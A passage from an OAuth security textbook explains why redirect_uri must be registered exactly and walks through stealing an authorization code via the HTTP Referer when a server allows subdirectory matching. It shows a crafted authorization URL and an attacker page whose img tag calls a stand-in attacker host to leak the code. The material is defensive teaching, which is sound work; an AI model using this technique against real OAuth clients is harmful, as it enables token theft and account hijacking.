**It is extremely important to pay particular attention when choosing the registered `redirect_uri` when the new OAuth client is created at the authorization server, specifically the `redirect_uri` must be as specific as it can be**. For example, if your OAuth client’s callback is

`https://yourouauthclient.com/oauth/oauthprovider/callback`

then ***DO*** register the entire URL

`https://yourouauthclient.com/oauth/oauthprovider/callback`

and ***NOT*** only the domain

`https://yourouauthclient.com/`

and ***NOT*** only part of the path

`https://yourouauthclient.com/oauth`

**If you’re not careful with `redirect_uri` registration requirements, token hijacking attacks become significantly easier than you might think**. Even big players with professional security audits have done it wrong.

**The main reason behind this is that sometimes authorization servers use different `redirect_uri` validation policies**. As we’ll see in chapter 9, the *only* reliably safe validation method the authorization server should adopt is *exact matching*. All the other potential solutions, based on regular expressions or allowing subdirectories of the registered `redirect_uri`, are [suboptimal](https://dictionary.cambridge.org/us/dictionary/english/suboptimal) and sometimes even dangerous.

### Stealing the authorization code through the referrer

**The first attack described targets the authorization code grant type and is based on information [leakage](https://dictionary.cambridge.org/us/dictionary/english/leakage) through the HTTP referrer**. **At the end of it, the attacker manages to [hijack](https://dictionary.cambridge.org/us/dictionary/english/hijack) the resource owner’s authorization code**. To understand this attack, it’s necessary to know what a referrer is and when it’s used. The HTTP referrer (misspelled as “referer” in the spec) is an HTTP header field that browsers (and HTTP clients in general) attach when surfing from one page to another. In this way, the new web page can see where the request came from, such as an incoming link from a remote site.

**Let’s assume you just registered an OAuth client to one OAuth provider that has an authorization server that uses the allowing subdirectory validation strategy for `redirect_uri`**.

Your OAuth callback endpoint is

`https://yourouauthclient.com/oauth/oauthprovider/callback`

but you registered as

`https://yourouauthclient.com/`

An [excerpt](https://dictionary.cambridge.org/us/dictionary/english/excerpt) of the request originated by your OAuth client while performing the OAuth integration might look like

`https://oauthprovider.com/authorize?response_type=code&client_id=CLIENT_ID&sc ope=SCOPES&state=STATE&redirect_uri=https://yourouauthclient.com/`

This particular OAuth provider adopts the allowing subdirectory validation strategy for `redirect_uri`, and therefore validates only the start of the URI and considers the request as valid if everything else is appended after the registered `redirect_uri`. Hence the registered `redirect_uri` is perfectly valid under a functional point of view, and things are good so far.

**The attacker also needs to be able to create a page on the target site underneath the registered redirect URI**, for example:

`https://yourouauthclient.com/usergeneratedcontent/attackerpage.html`

From here, it’s enough for the attacker to craft a special URI of this form:

`https://oauthprovider.com/authorize?response_type=code&client_id=CLIENT_ID &scope=SCOPES&state=STATE&redirect_uri=https://yourouauthclient.com/usergeneratedcontent/attackerpage.html`

and make the victim click on it, through any number of [phishing](https://dictionary.cambridge.org/us/dictionary/english/phishing) techniques.

**Note that the crafted URI contains a `redirect_uri` pointing to the attacker’s page, which is a subdirectory of the valid registered redirect URI for the client**. The attacker was then able to change the flow to something like what is shown in figure 7.3:framed_picture:.

Since you registered `https://yourouauthclient.com` as `redirect_uri` and the OAuth provider adopts an *allowing subdirectory* validation strategy, `https://yourouauthclient.com/usergeneratedcontent/attackerpage.html` is a perfectly valid `redirect_uri` for your client.

Remember some things that we have already learned:

* Often, resource owners need to authorize an OAuth client only once (at the first occurrence; see Trust On First Use (TOFU) in chapter 1). This means that all the subsequent calls will skip the manual consent screen as long as the server believes the request is from the same client and for the same access rights.
* People tend to trust companies that have proven records on security, so there is a good chance that this doesn’t switch the “anti-phishing alarm” on for the user.

That said, now that this is enough to “convince” the victim to click the crafted link and go through the authorization endpoint, the victim then will end up with something like

`https://yourouauthclient.com/usergeneratedcontent/attackerpage.html?code=e8e0dc1c-2258-6cca-72f3-7dbe0ca97a0b`

**Note the code request parameter ends up being attached in the URI of the malicious post**. You might be thinking that the attacker would need to have access to server-side processing in order to extract the code from that URI, functionality generally not available to user-generated content pages. Or perhaps the attacker would require the ability to inject arbitrary JavaScript into the page, which is often filtered out from user-generated content. However, let’s have a closer look at the code of `attackerpage.html`:

```html
<html>
    <h1>Authorization in progress </h1>
    <img src="https://attackersite.com/">
</html>
```

This simple page could look completely normal to a resource owner. In fact, since it doesn’t even have any JavaScript or other functional code, it could even be embedded into another page. **But in the background, the victim’s browser will load the embedded `img` tag for a resource at the attacker’s server**. **In that call, the HTTP Referer header will leak the authorization code (figure 7.4:framed_picture:)**.

Extracting the authorization code from the `Referer` is simple for the attacker because it’s delivered to him with the HTTP request for the embedded `img` tag in the attacker’s page.
